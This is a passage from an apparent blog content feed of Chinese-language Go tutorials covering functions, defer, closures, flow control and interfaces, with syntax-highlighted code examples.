punctuation">}</span></code></pre></li><li><p>一些总结：</p><ul><li>如果函数不需要返回值，那么可以省略返回值列表，若写了返回值列表，则必须使用<code>return</code>返回值。</li><li>返回值可以是<code>变量名+类型</code>，也可以直接是类型。</li><li>形参和返回值的变量名对于调用者而言是没有意义的，Go语言不存在类型于python一样的<code>key=value</code>传参方式。</li><li>Go语言形参不存在默认值的概念。</li><li>函数不能嵌套函数。（函数内只能用匿名函数）</li></ul></li></ul><h2 id="二、函数类型"><a href="#二、函数类型" class="headerlink" title="二、函数类型"></a>二、函数类型</h2><ul><li><p>函数是有类型的，函数的签名就是其类型。即如果两个函数的<code>形参类型</code>及<code>返回值类型</code>对应相同，那么这两个函数具有相同的类型。</p></li><li><p>函数类型可以作为形参的类型</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">calc</span><span class="token punctuation">(</span>deal <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> z <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">deal</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">sub</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">calc</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//3</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">calc</span><span class="token punctuation">(</span>sub<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//2</span><span class="token punctuation">}</span></code></pre></li><li><p>函数类型也可以作为返回值类型。</p></li></ul><h2 id="三、函数参数"><a href="#三、函数参数" class="headerlink" title="三、函数参数"></a>三、函数参数</h2><ul><li><p>Go语言的参数传递，值类型默认都是值传递，即传递的是拷贝。若要传递引用，可以使用指针，即在变量名前加<code>&amp;</code>。</p></li><li><p>切片（slice）、字典（map）、接口（interface）、通道（channel）这样的引用类型都是默认使用引用传递（即使没有显式的指出指针）。</p></li><li><p>可变长参数</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">test1</span><span class="token punctuation">(</span>nums <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1 2 3]</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">test2</span><span class="token punctuation">(</span>nums <span class="token operator">...</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> nums<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[]int</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//[4 5 6]</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token function">test2</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li>可变参数本质上是使用切片来接收，但是Go使用了语法糖技术，即 <code>...int</code> 等同于<code> []int</code> ，在函数内部二者没差异，差异体现在调用的时候，可以看到没有实现语法糖的函数调用需要传入切片。</li><li>要获得传入的多个参数就通过遍历切片。</li><li>要实现接收任意类型的多个参数可以使用： <code>...interface{}</code></li></ul></li></ul><h2 id="四、匿名函数"><a href="#四、匿名函数" class="headerlink" title="四、匿名函数"></a>四、匿名函数</h2><ul><li><p>匿名函数即没有函数名的函数，声明方式于普通函数声明方式的不同之处也仅在于没有函数名。</p></li><li><p>匿名函数作回调函数：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">handle</span><span class="token punctuation">(</span>list <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> callback <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> list <span class="token punctuation">{</span>                <span class="token function">callback</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        list <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"Mikasa"</span><span class="token punctuation">,</span> <span class="token string">"Toka"</span><span class="token punctuation">,</span> <span class="token string">"Tosaki"</span><span class="token punctuation">,</span> <span class="token string">"Yuigahama"</span><span class="token punctuation">,</span> <span class="token string">"Mashiro"</span><span class="token punctuation">}</span>        <span class="token function">handle</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s 赛高！！\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="五、闭包"><a href="#五、闭包" class="headerlink" title="五、闭包"></a>五、闭包</h2><ul><li>闭包即一个能记住嵌套作用域变量值的函数，尽管那个作用域或许已经不存在。</li><li>闭包 = 函数 + 上下文环境</li></ul><h2 id="六、defer"><a href="#六、defer" class="headerlink" title="六、defer"></a>六、defer</h2><ul><li><p><code>defer</code>关键字定义的语句在函数返回(<code>return</code>)之前才会被执行，若定义了多个<code>defer</code>语句，则逆序执行，后定义的先执行。</p></li><li><p><code>defer</code>通常用于释放连接（socket连接、数据库连接、文件句柄等）</p></li><li><p><code>return</code>语句不是原子操作，而是分为两个步骤：返回值赋值—&gt;RET。而<code>defer</code>处于两者之间执行。</p>  <img src="/2020/10/14/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%87%BD%E6%95%B0/image-20201014093647417.png" alt="image-20201014093647417" style="zoom: 67%;"><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//代码示例1</span><span class="token keyword">func</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>        x <span class="token operator">:=</span> <span class="token number">5</span>        <span class="token keyword">defer</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            x<span class="token operator">++</span>    <span class="token comment" spellcheck="true">//2.修改了x的值，而不是返回值</span>        <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> x  <span class="token comment" spellcheck="true">//1.将x的值赋值给返回值，由于没有指明返回值，因此GO内部会使用一个内存空间存储，x并不是返回值，而是将x的值给返回值。</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//代码示例2</span><span class="token keyword">func</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">defer</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                x<span class="token operator">++</span>  <span class="token comment" spellcheck="true">//2.修改了x，x是返回值，即修改了返回值</span>        <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">5</span> <span class="token comment" spellcheck="true">//1.将5赋值给返回值x</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//代码示例3</span><span class="token keyword">func</span> <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        x <span class="token operator">:=</span> <span class="token number">5</span>        <span class="token keyword">defer</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                x<span class="token operator">++</span> <span class="token comment" spellcheck="true">//2.修改了x的值，返回值y的值没有被修改。</span>        <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> x <span class="token comment" spellcheck="true">//1.将x的值5赋值给返回值y</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//代码示例4</span><span class="token keyword">func</span> <span class="token function">f4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">defer</span> <span class="token keyword">func</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                x<span class="token operator">++</span> <span class="token comment" spellcheck="true">//2.修改了x的值，但该x是外层函数x的拷贝。</span>        <span class="token punctuation">}</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">5</span> <span class="token comment" spellcheck="true">//1.将5赋值给返回值x</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//5</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//6</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//5</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">f4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//5</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="七、内置函数"><a href="#七、内置函数" class="headerlink" title="七、内置函数"></a>七、内置函数</h2><ul><li><code>close()</code> 主要用来关闭channel。</li><li><code>len()</code> 用于获取长度，比如string、array、slice、map、channel。</li><li><code>cap()</code> 用于获取容量。</li><li><code>copy()</code> 用于拷贝。</li><li><code>new</code> 用来分配内存，主要用来分配值类型，比如int、struct。返回的是指针。</li><li><code>make()</code> 用来分配内存，主要用来分配引用类型，比如chan、map、slice。</li><li><code>append()</code> 用来追加元素到slice中。</li><li><code>panic</code>和<code>recover</code>用来做错误处理。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go学习之路—流程控制</title>
      <link href="2020/10/13/Go%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
      <url>2020/10/13/Go%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="一、分支结构（if…else…）"><a href="#一、分支结构（if…else…）" class="headerlink" title="一、分支结构（if…else…）"></a>一、分支结构（if…else…）</h2><ul><li><p>条件不需要括号括起来。</p></li><li><p><code>else</code>或<code>else-if</code>必须紧接<code> }</code> 之后，不能另起。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"Mikasa"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"Yuigahama"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"Toka"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><code>if</code>语句可以在进入条件判断前，先执行语句：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">if</span> a <span class="token operator">:=</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> a <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//a变量的作用域只在该if代码块，执行完if便销毁</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"zzzzz"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"ccccc"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="二、循环结构（for）"><a href="#二、循环结构（for）" class="headerlink" title="二、循环结构（for）"></a>二、循环结构（for）</h2><ul><li><p>Go语言只有<code>for</code>语句用于循环，没有<code>while</code>及<code>do…while</code>。</p></li><li><p><code>break</code>语句可以结束<code>for</code>、<code>switch</code>和<code>select</code>的代码块。</p></li><li><p><code>continue</code>语句可以结束当前循环，开始下一次的循环迭代过程，仅限在<code>for</code>循环内使用。</p></li><li><p>for循环可以类似C语言写法，但是条件语句不用<code>（）</code>括起来:</p><pre class=" language-go"><code class="language-go"><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p>无限循环，相当于<code>while 1</code>：</p><pre class=" language-go"><code class="language-go">count <span class="token operator">:=</span> <span class="token number">0</span><span class="token keyword">for</span> <span class="token punctuation">{</span>    count<span class="token operator">++</span>    <span class="token keyword">if</span> count <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>省略初始化语句、循环结束执行的语句，就可以当作<code>if</code>使用：</p><pre class=" language-go"><code class="language-go">count <span class="token operator">:=</span> <span class="token number">4</span><span class="token keyword">for</span> count <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Tosaki"</span><span class="token punctuation">)</span>    count<span class="token operator">--</span><span class="token punctuation">}</span></code></pre></li><li><p>练习：9*9乘法表</p><pre class=" language-go"><code class="language-go"><span class="token keyword">for</span> x <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">;</span> x <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> x<span class="token operator">++</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> y <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">;</span> y <span class="token operator">&lt;=</span> x<span class="token punctuation">;</span> y<span class="token operator">++</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d*%d=%d "</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> x<span class="token operator">*</span>y<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>Go语言中可以使用 for range 遍历数组、切片、字符串、map 及通道（channel）。</strong></p><blockquote><ul><li>数组、切片、字符串返回索引和值。</li><li>map 返回键和值。</li><li>通道（channel）只返回通道内的值。</li></ul></blockquote></li></ul><h2 id="三、switch"><a href="#三、switch" class="headerlink" title="三、switch"></a>三、switch</h2><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 代码示例：</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> num <span class="token operator">*</span><span class="token builtin">int</span><span class="token operator">*</span> <span class="token operator">=</span> <span class="token number">4</span>    <span class="token keyword">switch</span> num <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—接口</title>
      <link href="2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E6%8E%A5%E5%8F%A3/"/>
      <url>2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="一、接口（interface）定义"><a href="#一、接口（interface）定义" class="headerlink" title="一、接口（interface）定义"></a>一、接口（interface）定义</h2><blockquote><p><strong>接口是一种类型。</strong></p><p><strong>接口是一种类型。</strong></p><p><strong>接口是一种类型。</strong></p></blockquote><ul><li><p>接口是一种约束类型，某个类型实现了某个接口，那么该类型就属于该接口类型。</p><ul><li>就可以用该接口类型的变量去接收实现了该接口的类型的数据。</li><li>意味着一个接口类型的变量可以作为形参接收多个类型的数据。</li></ul></li><li><p>接口是一组方法的集合，接口只关注实现了什么方法，而不关心方法实现的具体细节。</p></li><li><p>接口类型名即接口名，通常在名称后面加<code>er</code>表示接口。</p></li><li><p>当接口名和方法名的首字母都是大写时，该方法可以被该方法所在包以外的地方访问。</p></li><li><p><strong>接口类型定义</strong></p><ul><li><p>参数列表和返回值列表的变量名称可以省略，类型才是必须的，即可以只写类型。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> 接口名 <span class="token keyword">interface</span><span class="token punctuation">{</span>     方法名<span class="token function">1</span><span class="token punctuation">(</span> 参数<span class="token number">1</span><span class="token punctuation">,</span>参数<span class="token number">2</span>… <span class="token punctuation">)</span> <span class="token punctuation">(</span>返回值<span class="token number">1</span><span class="token punctuation">,</span>返回值<span class="token number">2</span><span class="token punctuation">)</span>     方法名<span class="token function">2</span><span class="token punctuation">(</span> 参数<span class="token number">1</span><span class="token punctuation">,</span>参数<span class="token number">2</span>… <span class="token punctuation">)</span> <span class="token punctuation">(</span>返回值<span class="token number">1</span><span class="token punctuation">,</span>返回值<span class="token number">2</span><span class="token punctuation">)</span>     …<span class="token punctuation">}</span></code></pre></li></ul></li></ul><h2 id="二、接口实现"><a href="#二、接口实现" class="headerlink" title="二、接口实现"></a>二、接口实现</h2><ul><li><p><strong>实现接口的条件</strong></p><ul><li>一个对象实现了接口的所有方法，那么就实现了这个接口。</li><li>实现接口的类型的方法的签名必须要与接口的方法的签名一致。（函数名、参数、返回值）</li></ul></li><li><p><strong>接口与类型的关系</strong></p><ul><li><p>一个类型可以实现多个接口。</p></li><li><p>一个接口可以被多个类型实现。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Car <span class="token keyword">interface</span> <span class="token punctuation">{</span>  <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">type</span> Porsche <span class="token keyword">struct</span> <span class="token punctuation">{</span>  name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">type</span> Benz <span class="token keyword">struct</span> <span class="token punctuation">{</span>  name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p Porsche<span class="token punctuation">)</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s running...\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>b Benz<span class="token punctuation">)</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s running...\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">drive</span><span class="token punctuation">(</span>c Car<span class="token punctuation">)</span> <span class="token punctuation">{</span>  c<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  ps <span class="token operator">:=</span> Porsche<span class="token punctuation">{</span>      name<span class="token punctuation">:</span> <span class="token string">"Porsche"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span>             bz <span class="token operator">:=</span> Benz<span class="token punctuation">{</span>      name<span class="token punctuation">:</span> <span class="token string">"Benz"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span>  <span class="token function">drive</span><span class="token punctuation">(</span>ps<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Porsche running...</span>  <span class="token function">drive</span><span class="token punctuation">(</span>bz<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Benz running...</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h2 id="三、值接收器和指针接收器"><a href="#三、值接收器和指针接收器" class="headerlink" title="三、值接收器和指针接收器"></a>三、值接收器和指针接收器</h2><ul><li><p><strong>实现接口的方法时用值接收器则是结构体实现了接口。</strong></p><ul><li>结构体及结构体指针都可以赋值给接口变量。</li></ul></li><li><p><strong>实现接口函数时使用指针接收器是结构体指针实现了接口。</strong></p><ul><li><p>只能使用结构体指针赋值给接口变量。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> speaker <span class="token keyword">interface</span> <span class="token punctuation">{</span>  <span class="token function">speaker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">type</span> cat <span class="token keyword">struct</span> <span class="token punctuation">{</span>  name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//指针接收器</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>cat<span class="token punctuation">)</span> <span class="token function">speaker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"miao miao miao ~"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> s speaker  c <span class="token operator">:=</span> cat<span class="token punctuation">{</span>      name<span class="token punctuation">:</span> <span class="token string">"feipei"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// s = c 报错，因为实现接口的不是cat，而是*cat，所以只能用结构体指针赋值给接口变量。</span>  s <span class="token operator">=</span> <span class="token operator">&amp;</span>c<span class="token punctuation">}</span></code></pre></li></ul></li></ul><h2 id="三、接口类型断言"><a href="#三、接口类型断言" class="headerlink" title="三、接口类型断言"></a>三、接口类型断言</h2><ul><li><p>接口也是使用两个字长的数据结构。</p><ul><li><p>第一个字是当前接口存储的值的类型。</p></li><li><p>第二个字是当前接口存储的对象。</p>  <img src="/2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E6%8E%A5%E5%8F%A3/未命名图片.png" alt="未命名图片" style="zoom:33%;"><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> tester <span class="token keyword">interface</span> <span class="token punctuation">{</span>  <span class="token function">whatever</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">type</span> st1 <span class="token keyword">struct</span> <span class="token punctuation">{</span>  name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">type</span> st2 <span class="token keyword">struct</span> <span class="token punctuation">{</span>  name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s st1<span class="token punctuation">)</span> <span class="token function">whatever</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"st1"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s st2<span class="token punctuation">)</span> <span class="token function">whatever</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"st2"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  s1 <span class="token operator">:=</span> st1<span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">"s1"</span><span class="token punctuation">}</span>  s2 <span class="token operator">:=</span> st2<span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">"s2"</span><span class="token punctuation">}</span>  <span class="token keyword">var</span> iface tester  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T %v\n"</span><span class="token punctuation">,</span> iface<span class="token punctuation">,</span> iface<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&lt;nil> &lt;nil></span>  iface <span class="token operator">=</span> s1  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T %v\n"</span><span class="token punctuation">,</span> iface<span class="token punctuation">,</span> iface<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//main.st1 {s1}</span>  iface <span class="token operator">=</span> s2  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T %v\n"</span><span class="token 